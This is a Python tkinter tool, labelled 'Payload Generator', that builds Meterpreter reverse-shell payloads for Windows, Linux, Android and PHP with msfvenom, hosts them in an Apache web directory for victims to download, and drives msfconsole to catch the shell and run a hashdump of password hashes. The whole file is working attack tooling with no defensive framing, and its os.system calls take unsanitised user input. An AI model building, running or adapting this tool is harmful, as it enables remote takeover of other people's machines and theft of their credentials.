import tkinter as tk
from tkinter import *
import os
import sys
import subprocess


def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


def quit_application():
    sys.exit()


def generate_payload(payload_type):
    lhost = lhost_entry.get()
    lport = lport_entry.get()
    name = name_entry.get()
    payload = ""
    extension = ""
    listener = ""

    if payload_type == 1:
        payload = "windows/meterpreter/reverse_tcp"
        extension = "exe"
    elif payload_type == 2:
        payload = "linux/x86/meterpreter/reverse_tcp"
        extension = "elf"
    elif payload_type == 3:
        payload = "android/meterpreter/reverse_tcp"
        extension = "apk"
    elif payload_type == 4:
        payload = "php/meterpreter/reverse_tcp"
        extension = "php"

    os.system("msfvenom -p %s LHOST=%s LPORT=%s -f %s > %s.%s" % (payload, lhost, lport, extension, name, extension))
    clear()
    output_label.config(text="Payload Successfully Generated")

    os.system('sudo service apache2 start')
    os.system('sudo cp %s.%s /var/www/html' % (name, extension))
    output_label.config(text="Your IP Successfully Poisoned : %s/%s.%s" % (lhost, name, extension))

    msf_commands = """
    use exploit/multi/handler
            set PAYLOAD %s
            set LHOST %s
            set LPORT %s
            exploit
        """ % (payload, lhost, lport)

    session_commands = """
    sessions -i <session_id>
    shell
    getuid
    run post/windows/gather/hashdump
    # User can add more commands to be executed on the target
    exit
    """

    # Start Metasploit
    msf_process = subprocess.Popen(['msfconsole'], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE, text=True)

    msf_process.stdin.write(msf_commands)
    msf_process.stdin.flush()

    # Replace <session_id> with the actual session ID
    session_commands = session_commands.replace("<session_id>", "<actual_session_id>")

    # Interact with the session
    msf_process.stdin.write(session_commands)
    msf_process.stdin.flush()

    # Read and process session output (stdout)
    while True:
        output = msf_process.stdout.readline()
        if output == '':
            break
        print(output.strip())

    # Close the Metasploit process
    msf_process.stdin.close()
    msf_process.stdout.close()
    msf_process.stderr.close()
    msf_process.wait()


window = tk.Tk()

window.geometry('620x660+300+300')
window.config(background='#e6ffe6')
window.title("Payload Generator")
window.anchor("center")

# LHOST entry
lhost_label = tk.Label(window, text="Enter listener host IP: ")
lhost_entry = tk.Entry(window)
lhost_label.grid(row=0, column=0, padx=5, pady=5)
lhost_label.config(bg='#e6ffe6')
lhost_entry.grid(row=0, column=1, padx=5, pady=5)

# LPORT entry
lport_label = tk.Label(window, text="Enter listener port: ")
lport_label.config(bg='#e6ffe6')
lport_entry = tk.Entry(window)
lport_label.grid(row=1, column=0, padx=5, pady=5)
lport_entry.grid(row=1, column=1, padx=5, pady=5)

# Payload Name entry
name_label = tk.Label(window, text="Enter Payload Name: ")
name_label.config(bg='#e6ffe6')
name_entry = tk.Entry(window)
name_label.grid(row=2, column=0, padx=5, pady=5)
name_entry.grid(row=2, column=1, padx=5, pady=5)

# Create the payload type options
label = tk.Label(window, text="Choose payload type:")
label.grid(row=3, column=0, padx=5, pady=5)
label.config(bg='#e6ffe6')

choice_var = tk.IntVar()
choice_var.set(1)

radio1 = tk.Radiobutton(window, text="Windows", variable=choice_var, value=1)
radio1.config(bg='#e6ffe6')
radio1.grid(row=3, column=1, padx=70, pady=5, sticky=W)

radio2 = tk.Radiobutton(window, text="Linux", variable=choice_var, value=2)
radio2.config(bg='#e6ffe6')
radio2.grid(row=4, column=1, padx=70, pady=5, sticky=W)

radio3 = tk.Radiobutton(window, text="Android", variable=choice_var, value=3)
radio3.config(bg='#e6ffe6')
radio3.grid(row=5, column=1, padx=70, pady=5, sticky=W)

radio4 = tk.Radiobutton(window, text="Php", variable=choice_var, value=4)
radio4.config(bg='#e6ffe6')
radio4.grid(row=6, column=1, padx=70, pady=5, sticky=W)

# Submit button
submit_button = tk.Button(window, text="Generate Payload", command=lambda: generate_payload(choice_var.get()))
submit_button.grid(row=10, column=0, padx=5, pady=10)
submit_button.config(bg='#4da6ff', fg="white", font=('Sans', '10', 'bold'))

# Quit button
quit_button = tk.Button(window, text="Quit", command=quit_application)
quit_button.grid(row=10, column=1, padx=5, pady=5)
quit_button.config(bg='#ff704d', fg="white", font=('Sans', '10', 'bold'))

# Output label
output_label = tk.Label(window, text="")
output_label.grid(row=11, column=0, columnspan=2, padx=5, pady=10)
output_label.config(bg='#e6ffe6')

window.mainloop()
